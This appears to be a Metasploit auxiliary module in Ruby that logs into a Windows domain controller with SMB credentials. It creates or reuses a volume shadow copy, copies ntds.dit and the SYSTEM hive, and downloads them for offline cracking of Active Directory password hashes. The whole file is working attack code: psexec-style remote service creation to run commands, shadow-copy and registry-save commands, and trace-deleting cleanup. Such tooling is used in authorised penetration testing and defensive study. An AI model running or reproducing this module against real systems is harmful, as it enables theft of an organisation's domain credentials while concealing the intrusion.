require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Remote::SMB::Authenticated
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	# Aliases for common classes
	SIMPLE = Rex::Proto::SMB::SimpleClient
	XCEPT  = Rex::Proto::SMB::Exceptions
	CONST  = Rex::Proto::SMB::Constants

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Windows Domain Controller - Download NTDS.dit and SYSTEM Hive',
			'Description'    => %q{This module authenticates to an Active Directory Domain Controller and creates
				a volume shadow copy of the %SYSTEMDRIVE%.  It then pulls down copies of the ntds.dit file as well
				as the SYSTEM hive and stores them on your attacking machine.  The ntds.dit and SYSTEM copy can be used
				in combination with other tools for offline extraction of AD password hashes.  All of this is possible without
				uploading a single binary to the target host.
			},

			'Author'         => [
				'Royce Davis @R3dy__ <rdavis[at]accuvant.com>',
			],

			'License'        => MSF_LICENSE,
			'References'     => [
				[ 'URL', 'http://sourceforge.net/projects/smbexec' ],
				[ 'URL', 'http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access' ]
			],
		))

		register_options([
			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
			OptString.new('LOGDIR', [true, 'This is a directory on your local attacking system used to store the ntds.dit and SYSTEM hive', '/tmp/NTDS_Grab']),
			OptString.new('VSCPATH', [false, 'The path to the target Volume Shadow Copy', '']),
			OptString.new('WINPATH', [true, 'The name of the Windows directory (examples: WINDOWS, WINNT)', 'WINDOWS']),
		], self.class)

		deregister_options('RHOST')
	end



	def peer
		return "#{rhost}:#{rport}"
	end



	# This is the main control method
	def run_host(ip)
		text = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
		bat = "%WINDIR%\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
		createvsc = "vssadmin create shadow /For=%SYSTEMDRIVE%"
		logdir = datastore['LOGDIR']
		smbshare = datastore['SMBSHARE']

		if connect
			#Try and authenticate with given credentials
			begin
				smb_login
			rescue StandardError => autherror
				print_error("Unable to authenticate with given credentials: #{autherror}")
				return
			end

			if datastore['VSCPATH'].length > 0
				print_status("#{peer} - Attempting to grab NTDS.dit from #{datastore['VSCPATH']}")
				vscpath = datastore['VSCPATH']
			else
				vscpath = check_vss(ip, text, bat)
				unless vscpath
					vscpath = make_volume_shadow_copy(ip, createvsc, text, bat)
				end
			end
			if vscpath
				n = copy_ntds(ip, vscpath)
				s = copy_sys_hive(ip)
				if n && s
					download_ntds(smbshare, (datastore['WINPATH'] + "\\Temp\\ntds"), ip, logdir)
					download_sys_hive(smbshare, (datastore['WINPATH'] + "\\Temp\\sys"), ip, logdir)
				end
			else
				print_error("#{peer} - Failed to find a volume shadow copy")
			end
			cleanup_after(ip)
			disconnect
		end
	end



	# Thids method will check if a Volume Shadow Copy already exists and use that rather
	# then creating a new one
	def check_vss(ip, text, bat)
		begin
			print_status("#{ip} - Checking if a Volume Shadow Copy exists already.")
			# Check is VSC already exists
			prepath = '\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy'
			command = "%COMSPEC% /C echo vssadmin list shadows ^> %SYSTEMDRIVE%#{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}"
			result = psexec(command)
			simple.connect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
			outfile = simple.open(text, 'ro')
			data = outfile.read
			vscs = []
			simple.disconnect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
			cleanup = "%COMSPEC% /C del /F /Q %SYSTEMDRIVE%#{text} & del /F /Q #{bat}"
			result = psexec(cleanup)
			data.each_line { |line| vscs << line if line.include?("GLOBALROOT") }
			if vscs.empty?
				print_status("#{ip} - No VSC Found.")
				return nil
			end
			vscpath = prepath + vscs[vscs.length - 1].to_s.split("ShadowCopy")[1].to_s.chomp
			print_good("#{ip} - Volume Shadow Copy exists on #{vscpath}")
			return vscpath
		rescue StandardError => vsscheckerror
			print_error("#{ip} - Unable to determine if VSS is enabled: #{vsscheckerror}")
			return nil
		end
	end



	# Create a Volume Shadow Copy on the target host
	def make_volume_shadow_copy(ip, createvsc, text, bat)
		begin
			#Try to create the shadow copy
			command = "%COMSPEC% /C echo #{createvsc} ^> %SYSTEMDRIVE%#{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}"
			print_status("Creating Volume Shadow Copy")
			out = psexec(command)
			#Get path to Volume Shadow Copy
			vscpath = get_vscpath(ip, text)
		rescue StandardError => vscerror
			print_error("Unable to create the Volume Shadow Copy: #{vscerror}")
			return nil
		end
		if vscpath
			begin
				cleanup = "%COMSPEC% /C del /F /Q %SYSTEMDRIVE%#{text} & del /F /Q #{bat}"
				# Run cleanup command
				out = psexec(cleanup)
			rescue StandardError => cleanuperror
				print_error("Cleanup Command failed: #{cleanuperror}")
				return nil
			end
			print_good("Volume Shadow Copy created on #{vscpath}")
			return vscpath
		else
			return nil
		end
	end



	# Copy ntds.dit from the Volume Shadow copy to the Windows Temp directory on the target host
	def copy_ntds(ip, vscpath)
		print_status("Copying ntds.dit to Windows Temp directory")
		begin
			# Try to copy ntds.dit from VSC
			ntdspath = vscpath.to_s + "\\" + datastore['WINPATH'] + "\\NTDS\\ntds.dit"
			command = "%COMSPEC% /C copy /Y \"#{ntdspath}\" %WINDIR%\\Temp\\ntds"
			return psexec(command)
		rescue StandardError => ntdscopyerror
			print_error("Unable to copy ntds.dit from Volume Shadow Copy.  Make sure target is a Windows Domain Controller: #{ntdscopyerror}")
			return ntdscopyerror
		end
	end



	# Create a copy of the SYSTEM hive file and stores it in the Windows
	# Temp directory on the target host
	def copy_sys_hive(ip)
		print_status("Copying SYSTEM hive file to Windows Temp directory")
		begin
			# Try to crate the sys hive copy
			command = "%COMSPEC% /C reg.exe save HKLM\\SYSTEM %WINDIR%\\Temp\\sys /y"
			return psexec(command)
		rescue StandardError => hiveerror
			print_error("Unable to copy the SYSTEM hive file: #{hiveerror}")
			return hiveerror
		end
	end



	# Download the ntds.dit copy to your attacking machine
	def download_ntds(smbshare, file, ip, logdir)
		print_status("Downloading ntds.dit file")
		begin
			# Try to download ntds.dit
			newdir = "#{logdir}/#{ip}"
			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
			simple.connect("\\\\#{ip}\\#{smbshare}")
			remotefile = simple.open("#{file}", 'rob')
			data = remotefile.read
			#Save it to local file system
			file = File.open("#{logdir}/#{ip}/ntds", "wb+")
			file.write(data)
			file.close
			remotefile.close
		rescue StandardError => ntdsdownloaderror
			print_error("Unable to downlaod ntds.dit: #{ntdsdownloaderror}")
			return ntdsdownloaderror
		end
		simple.disconnect("\\\\#{ip}\\#{smbshare}")
	end



	# Download the SYSTEM hive copy to your attacking machine
	def download_sys_hive(smbshare, file, ip, logdir)
		print_status("Downloading SYSTEM hive file")
		begin
			# Try to download SYSTEM hive
			newdir = "#{logdir}/#{ip}"
			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
			simple.connect("\\\\#{ip}\\#{smbshare}")
			remotefile = simple.open("#{file}", 'rob')
			data = remotefile.read
			#Save it to local file system
			file = File.open("#{logdir}/#{ip}/sys", "wb+")
			file.write(data)

			file.close
			remotefile.close
		rescue StandardError => sysdownloaderror
			print_error("Unable to download SYSTEM hive: #{sysdownloaderror}")
			return sysdownloaderror
		end
	end



	# Delete the ntds.dit and SYSTEM hive copies from the Windows Temp directory
	def cleanup_after(ip)
		print_status("Deleting ntds.dit and SYSTEM hive copies:")
		begin
			# Try to delete the ntds.dit and SYSTEM hive copies
			command = "%COMSPEC% /C del /F /Q %WINDIR%\\Temp\\ntds & del /F /Q %WINDIR%\\Temp\\sys"
			result = psexec(command)
		rescue StandardError => deleteerror
			print_error("Unable to delete ntds.dit and SYSTEM hive copies: #{deleteerror}")
			return deleteerror
		end
	end



	# Gets the path to the Volume Shadow Copy
	def get_vscpath(ip, file)
		begin
			prepath = '\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy'
			vsc = ""
			simple.connect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
			outfile = simple.open(file, 'ro')
			output = outfile.read
			output.each_line do |line|
				vsc += line if line.include?("GLOBALROOT")
			end
			outfile.close
			simple.disconnect("\\\\#{ip}\\#{datastore['SMBSHARE']}")
			return prepath + vsc.split("ShadowCopy")[1].chomp
		rescue StandardError => vscpath_error
			print_error("Could not determine the exact path to the VSC check your WINPATH")
			return nil
		end
	end



	# This code was stolen straight out of psexec.rb.  Thanks very much for all who contributed to that module!!
	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
	def psexec(command)

		simple.connect("IPC$")

		handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
		vprint_status("#{peer} - Binding to #{handle} ...")
		dcerpc_bind(handle)
		vprint_status("#{peer} - Bound to #{handle} ...")

		vprint_status("#{peer} - Obtaining a service manager handle...")
		scm_handle = nil
		stubdata =
			NDR.uwstring("\\\\#{rhost}") + NDR.long(0) + NDR.long(0xF003F)
		begin
			response = dcerpc.call(0x0f, stubdata)
			if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
				scm_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("#{peer} - Error: #{e}")
			return false
		end

		servicename = Rex::Text.rand_text_alpha(11)
		displayname = Rex::Text.rand_text_alpha(16)
		holdhandle = scm_handle
		svc_handle = nil
		svc_status = nil

		stubdata =
			scm_handle + NDR.wstring(servicename) + NDR.uwstring(displayname) +

			NDR.long(0x0F01FF) + # Access: MAX
			NDR.long(0x00000110) + # Type: Interactive, Own process
			NDR.long(0x00000003) + # Start: Demand
			NDR.long(0x00000000) + # Errors: Ignore
			NDR.wstring( command ) +
			NDR.long(0) + # LoadOrderGroup
			NDR.long(0) + # Dependencies
			NDR.long(0) + # Service Start
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0) # Password
		begin
			vprint_status("#{peer} - Creating the service...")
			response = dcerpc.call(0x0c, stubdata)
			if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
				svc_handle = dcerpc.last_response.stub_data[0,20]
				svc_status = dcerpc.last_response.stub_data[24,4]
			end
		rescue ::Exception => e
			print_error("#{peer} - Error: #{e}")
			return false
		end

		vprint_status("#{peer} - Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception
		end

		vprint_status("#{peer} - Opening service...")
		begin
			stubdata =
				scm_handle + NDR.wstring(servicename) + NDR.long(0xF01FF)

			response = dcerpc.call(0x10, stubdata)
			if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
				svc_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("#{peer} - Error: #{e}")
			return false
		end

		vprint_status("#{peer} - Starting the service...")
		stubdata =
			svc_handle + NDR.long(0) + NDR.long(0)
		begin
			response = dcerpc.call(0x13, stubdata)
			if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
			end
		rescue ::Exception => e
			print_error("#{peer} - Error: #{e}")
			return false
		end

		vprint_status("#{peer} - Removing the service...")
		stubdata =
			svc_handle
		begin
			response = dcerpc.call(0x02, stubdata)
			if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
		end
			rescue ::Exception => e
			print_error("#{peer} - Error: #{e}")
		end

		vprint_status("#{peer} - Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception => e
			print_error("#{peer} - Error: #{e}")
		end

		select(nil, nil, nil, 1.0)
		simple.disconnect("IPC$")
		return true
	end

end
